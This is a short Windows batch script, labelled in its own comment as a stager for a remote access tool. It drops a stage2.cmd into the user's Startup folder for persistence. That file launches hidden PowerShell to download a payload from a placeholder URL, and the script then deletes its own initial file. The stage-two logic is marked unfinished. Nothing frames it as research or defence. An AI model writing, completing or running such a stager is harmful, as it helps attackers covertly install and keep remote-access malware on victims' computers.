@echo off
@REM stager for remote access tool

@REM variables  
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move to startup directory
cd %STARTUP%

@REM To Do: build out stage 2 (build stage2 or download it through internet)
@REM write playloads to startup 
(
    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri url_to_payload -OutFile p.ps1"

) > stage2.cmd

@REM run payload
powershell ./stage2.cmd


@REM cd back into initial location
cd "%INITIALPATH%"
del initial.cmd